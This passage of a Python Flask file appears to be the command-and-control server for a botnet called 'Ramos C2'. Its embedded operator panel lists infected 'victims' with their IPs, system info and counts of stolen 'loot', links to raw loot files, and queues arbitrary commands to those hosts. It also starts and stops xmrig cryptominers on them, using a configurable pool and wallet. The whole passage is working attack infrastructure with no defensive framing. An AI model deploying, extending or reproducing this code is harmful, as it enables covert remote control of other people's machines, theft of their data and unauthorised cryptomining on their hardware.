    localStorage.removeItem("ramos_master");
  } finally {
    btn.disabled = false; btn.innerHTML = "&#128273; UNLOCK";
  }
}

function lock(){
  K = ""; localStorage.removeItem("ramos_master");
  clearInterval(showApp._t); showApp._t = null;
  $("appView").style.display = "none";
  $("loginView").style.display = "flex";
  $("key").value = ""; $("key").focus();
  toast("locked");
}

function minerPill(v){
  const m = v.miner && v.miner.running;
  return '<span class="pill ' + (m ? "on" : "off") + '">' + (m ? "&#9889; MINING" : "idle") + "</span>";
}

async function load(quiet){
  if (refreshing) return;
  refreshing = true;
  try {
    const d = await api("/api/victims");
    $("xmrig").innerHTML = d.xmrig_present
      ? '<span class="ok">xmrig.exe: present</span>'
      : '<span class="warn">xmrig.exe: MISSING — drop official build next to c2_server.py</span>';
    if (d.miner_defaults){
      if (!$("mpool").value) $("mpool").value = d.miner_defaults.pool || "";
      if (!$("mwallet").value) $("mwallet").value = d.miner_defaults.wallet || "";
      if (!$("mcpu").value) $("mcpu").value = d.miner_defaults.cpu_max || 50;
    }
    const rows = d.victims || [];
    $("vcount").textContent = "— " + rows.length + " seen";
    if (!rows.length){
      $("vt").innerHTML = '<tr><td colspan=6 class=dim>no victims yet — run a client against the panel</td></tr>';
    } else {
      $("vt").innerHTML = rows.map(v =>
        '<tr class="vrow' + (selected === v.id ? " sel" : "") + '" data-vid="' + esc(v.id) + '">'
        + "<td><code>" + esc(v.id) + "</code>" + (v.agent ? ' <span class="pill" style="background:#12233a;color:var(--cyn)">agent</span>' : "") + "</td>"
        + "<td>" + esc((v.last_seen || "?").replace("T"," ").slice(0,19)) + "</td>"
        + '<td class=hide-s>' + esc(v.ip || "?") + "</td>"
        + "<td>" + (v.records || 0) + "</td>"
        + "<td>" + minerPill(v) + "</td>"
        + '<td><button class="ghost mini" data-act="start" data-vid="' + esc(v.id) + '">start</button> '
        + '<button class="danger mini" data-act="stop" data-vid="' + esc(v.id) + '">stop</button></td></tr>'
      ).join("");
    }
    if (selected) await detail(selected, true);
    $("clock").textContent = "auto-refresh 15s · last " + new Date().toLocaleTimeString();
  } catch (e) {
    if (!quiet){
      if (e.message === "key rejected") lock();
      else toast(e.message, true);
    }
  } finally { refreshing = false; }
}

async function detail(id, quiet){
  selected = id;
  if ($("tv").value !== id && !quiet) $("tv").value = id;
  $("detTitle").textContent = "— " + id;
  try {
    const d = await api("/api/victim/" + encodeURIComponent(id));
    const v = d.victim || {};
    const counts = v.loot_counts || {};
    const chips = Object.keys(counts).map(k => '<span class="pill" style="background:#1a1a2e;margin:2px 4px 2px 0">' + esc(k) + " " + counts[k] + "</span>").join("") || '<span class=dim>none decoded</span>';
    const tasks = (d.tasks || []).map(t =>
      '<div class="small" style="margin:3px 0"><span class="' + (t.done ? "ok" : "cy") + '">'
      + (t.done ? "&#10003;" : "&#9679;") + "</span> " + esc(t.type) + " <span class=dim>· "
      + esc((t.ts || "").replace("T"," ").slice(0,19)) + "</span> "
      + (t.output_tail ? "<pre style='margin-top:5px'>" + esc(t.output_tail) + "</pre>" : "") + "</div>").join("") || '<span class=dim>no tasks</span>';
    const results = (d.results || []).map(r =>
      '<div class=small style="margin:4px 0"><span class=dim>' + esc((r.ts || "").replace("T"," ").slice(0,19))
      + "</span> <pre style='margin-top:4px'>" + esc(typeof r.output === "string" ? r.output : JSON.stringify(r.output, null, 1)) + "</pre></div>").join("");
    const sys = v.sysinfo ? esc(JSON.stringify(v.sysinfo)) : "<span class=dim>hidden</span>";
    $("det").innerHTML =
      '<div class=row style="margin-bottom:10px">' + minerPill(v)
      + '<span class="pill" style="background:#1a1a2e">beacons ' + (v.beacons || 0) + "</span>"
      + '<span class="pill" style="background:#1a1a2e">records ' + (v.records || 0) + "</span></div>"
      + '<p class=small><span class=dim>sysinfo:</span> ' + sys + "</p>"
      + '<p class=small style="margin:8px 0 4px"><span class=dim>loot:</span><br>' + chips + "</p>"
      + '<p class="small" style="margin:12px 0 4px"><span class=dim>tasks:</span></p>' + tasks
      + (results ? '<p class="small" style="margin:12px 0 4px"><span class=dim>results:</span></p>' + results : "")
      + '<p class="small" style="margin:12px 0 0"><a href="/loot/shard_' + encodeURIComponent(id)
      + '.json" style="color:var(--cyn)" target="_blank" rel="noopener">open raw shard &#8599;</a></p>';
    if (!quiet){ document.querySelector('[data-vid="' + CSS.escape(id) + '"]'); $("det").scrollIntoView({behavior:"smooth",block:"nearest"}); }
  } catch (e) { if (!quiet) toast(e.message, true); }
}

async function minerOp(vid, act){
  try {
    const d = await api("/api/miner", {method:"POST",
      body:JSON.stringify({victim_id:vid, action:act})});
    toast(act === "start" ? "miner_start queued → " + vid : "miner_stop queued → " + vid);
    await load(true);
    if (selected) await detail(selected, true);
  } catch (e) { toast(e.message, true); }
}

async function sendTask(){
  const vid = $("tv").value.trim();
  if (!vid){
    $("tres").innerHTML = '<p class="small bad">&#10007; pick a victim id first</p>';
    toast("pick a victim id first", true); return;
  }
  const type = $("tt").value;
  let args = {};
  const raw = $("ta").value.trim();
  if (raw){
    try { args = JSON.parse(raw); }
    catch (e){
      const m = "args must be valid JSON";
      $("tres").innerHTML = '<p class="small bad">&#10007; ' + m + "</p>";
      toast(m, true); return;
    }
  }
  if (typeof args === "string") args = {cmd:args};
  const btn = $("taskBtn");
  btn.disabled = true; btn.textContent = "queueing…";
  try {
    const d = await api("/api/task", {method:"POST",
      body:JSON.stringify({victim_id:vid, type:type, args:args})});
    $("tres").innerHTML = '<p class="small ok">&#10003; queued ' + esc(type) + " → <code>"
      + esc(vid) + "</code> <span class=dim>task " + esc(d.task ? d.task.id : "?") + "</span></p>";
    toast("task queued: " + type);
    if (selected) await detail(selected, true);
  } catch (e) {
    $("tres").innerHTML = '<p class="small bad">&#10007; ' + esc(e.message) + "</p>";
    toast(e.message, true);
  } finally { btn.disabled = false; btn.textContent = "QUEUE"; }
}

async function saveMiner(){
  const btn = $("saveMinerBtn");
  const cpu = parseInt($("mcpu").value || "50", 10);
  if (isNaN(cpu) || cpu < 1 || cpu > 100){ toast("cpu must be 1-100", true); return; }
  btn.disabled = true; btn.textContent = "saving…";
  try {
    await api("/api/miner", {method:"POST", body:JSON.stringify({
      pool: $("mpool").value.trim(),
      wallet: $("mwallet").value.trim(),
      cpu_max: cpu
    })});
    toast("miner defaults saved");
  } catch (e) { toast(e.message, true); }
  finally { btn.disabled = false; btn.textContent = "SAVE"; }
}

$("loginForm").addEventListener("submit", e => { e.preventDefault(); login(); });
$("refreshBtn").addEventListener("click", () => load());
$("lockBtn").addEventListener("click", lock);
$("taskBtn").addEventListener("click", sendTask);
$("saveMinerBtn").addEventListener("click", saveMiner);
$("vt").addEventListener("click", e => {
  const b = e.target.closest("button[data-act]");
  if (b){ e.stopPropagation(); minerOp(b.dataset.vid, b.dataset.act); return; }
  const row = e.target.closest("tr[data-vid]");
  if (row) detail(row.dataset.vid);
});

if (K) login(); else $("key").focus();
</script>
</body></html>"""

@app.route("/panel", methods=["GET"])
@app.route("/admin", methods=["GET"])
@app.route("/dashboard", methods=["GET"])
def panel():
    # /dashboard used to 404 (dead dashboard); it now serves the SaaS panel
    return Response(PANEL_HTML, mimetype="text/html",
                    headers={"Cache-Control": "no-store"})

@app.route("/", methods=["GET"])
def index():
    return ("", 404)

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--tls-cert", default=None, help="panel.crt for pinned-TLS mod endpoint")
    ap.add_argument("--tls-key", default=None, help="panel.key for pinned-TLS mod endpoint")
    a = ap.parse_args()
    print(f"Ramos C2 listening on 0.0.0.0:{a.port}, loot -> ./loot", flush=True)
    if a.tls_cert and a.tls_key:
        import ssl
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(a.tls_cert, a.tls_key)
        app.run(host="0.0.0.0", port=a.port, ssl_context=context)
    else:
        app.run(host="0.0.0.0", port=a.port)
